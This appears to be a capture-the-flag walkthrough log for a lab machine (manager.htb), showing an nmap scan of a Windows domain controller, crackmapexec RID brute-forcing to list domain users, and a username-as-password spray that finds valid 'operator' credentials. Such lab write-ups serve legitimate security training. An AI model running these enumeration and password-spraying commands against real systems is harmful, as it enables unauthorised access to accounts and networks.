@@ -1,0 +1,76 @@
+> nmap -sV 10.10.11.236
+
+	Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-06 19:15 CET
+	Nmap scan report for 10.10.11.236
+	Host is up (0.022s latency).
+	Not shown: 987 filtered tcp ports (no-response)
+	PORT     STATE SERVICE       VERSION
+	53/tcp   open  domain        Simple DNS Plus
+	80/tcp   open  http          Microsoft IIS httpd 10.0
+	88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-11-07 01:15:52Z)
+	135/tcp  open  msrpc         Microsoft Windows RPC
+	139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+	389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
+	445/tcp  open  microsoft-ds?
+	464/tcp  open  kpasswd5?
+	593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+	636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
+	1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000
+	3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
+	3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
+	Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+	Nmap done: 1 IP address (1 host up) scanned in 49.85 seconds
+
+> crackmapexec smb manager.htb -u 'test' -p '' --rid-brute
+
+	SMB         manager.htb     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
+	SMB         manager.htb     445    DC01             [+] manager.htb\test: 
+	SMB         manager.htb     445    DC01             [+] Brute forcing RIDs
+	SMB         manager.htb     445    DC01             498: MANAGER\Enterprise Read-only Domain Controllers (SidTypeGroup)
+	SMB         manager.htb     445    DC01             500: MANAGER\Administrator (SidTypeUser)
+	SMB         manager.htb     445    DC01             501: MANAGER\Guest (SidTypeUser)
+	SMB         manager.htb     445    DC01             502: MANAGER\krbtgt (SidTypeUser)
+	SMB         manager.htb     445    DC01             512: MANAGER\Domain Admins (SidTypeGroup)
+	SMB         manager.htb     445    DC01             513: MANAGER\Domain Users (SidTypeGroup)
+	SMB         manager.htb     445    DC01             514: MANAGER\Domain Guests (SidTypeGroup)
+	SMB         manager.htb     445    DC01             515: MANAGER\Domain Computers (SidTypeGroup)
+	SMB         manager.htb     445    DC01             516: MANAGER\Domain Controllers (SidTypeGroup)
+	SMB         manager.htb     445    DC01             517: MANAGER\Cert Publishers (SidTypeAlias)
+	SMB         manager.htb     445    DC01             518: MANAGER\Schema Admins (SidTypeGroup)
+	SMB         manager.htb     445    DC01             519: MANAGER\Enterprise Admins (SidTypeGroup)
+	SMB         manager.htb     445    DC01             520: MANAGER\Group Policy Creator Owners (SidTypeGroup)
+	SMB         manager.htb     445    DC01             521: MANAGER\Read-only Domain Controllers (SidTypeGroup)
+	SMB         manager.htb     445    DC01             522: MANAGER\Cloneable Domain Controllers (SidTypeGroup)
+	SMB         manager.htb     445    DC01             525: MANAGER\Protected Users (SidTypeGroup)
+	SMB         manager.htb     445    DC01             526: MANAGER\Key Admins (SidTypeGroup)
+	SMB         manager.htb     445    DC01             527: MANAGER\Enterprise Key Admins (SidTypeGroup)
+	SMB         manager.htb     445    DC01             553: MANAGER\RAS and IAS Servers (SidTypeAlias)
+	SMB         manager.htb     445    DC01             571: MANAGER\Allowed RODC Password Replication Group (SidTypeAlias)
+	SMB         manager.htb     445    DC01             572: MANAGER\Denied RODC Password Replication Group (SidTypeAlias)
+	SMB         manager.htb     445    DC01             1000: MANAGER\DC01$ (SidTypeUser)
+	SMB         manager.htb     445    DC01             1101: MANAGER\DnsAdmins (SidTypeAlias)
+	SMB         manager.htb     445    DC01             1102: MANAGER\DnsUpdateProxy (SidTypeGroup)
+	SMB         manager.htb     445    DC01             1103: MANAGER\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)
+	SMB         manager.htb     445    DC01             1113: MANAGER\Zhong (SidTypeUser)
+	SMB         manager.htb     445    DC01             1114: MANAGER\Cheng (SidTypeUser)
+	SMB         manager.htb     445    DC01             1115: MANAGER\Ryan (SidTypeUser)
+	SMB         manager.htb     445    DC01             1116: MANAGER\Raven (SidTypeUser)
+	SMB         manager.htb     445    DC01             1117: MANAGER\JinWoo (SidTypeUser)
+	SMB         manager.htb     445    DC01             1118: MANAGER\ChinHae (SidTypeUser)
+	SMB         manager.htb     445    DC01             1119: MANAGER\Operator (SidTypeUser)
+
+> crackmapexec smb manager.htb -u users.txt -p users.txt --no-bruteforce
+
+	SMB         manager.htb     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
+	SMB         manager.htb     445    DC01             [-] manager.htb\administrator:administrator STATUS_LOGON_FAILURE 
+	SMB         manager.htb     445    DC01             [-] manager.htb\guest:guest STATUS_LOGON_FAILURE 
+	SMB         manager.htb     445    DC01             [-] manager.htb\krbtgt:krbtgt STATUS_LOGON_FAILURE 
+	SMB         manager.htb     445    DC01             [-] manager.htb\zhong:zhong STATUS_LOGON_FAILURE 
+	SMB         manager.htb     445    DC01             [-] manager.htb\cheng:cheng STATUS_LOGON_FAILURE 
+	SMB         manager.htb     445    DC01             [-] manager.htb\ryan:ryan STATUS_LOGON_FAILURE 
+	SMB         manager.htb     445    DC01             [-] manager.htb\raven:raven STATUS_LOGON_FAILURE 
+	SMB         manager.htb     445    DC01             [-] manager.htb\jinWoo:jinWoo STATUS_LOGON_FAILURE 
+	SMB         manager.htb     445    DC01             [-] manager.htb\chinHae:chinHae STATUS_LOGON_FAILURE 
+	SMB         manager.htb     445    DC01             [+] manager.htb\operator:operator
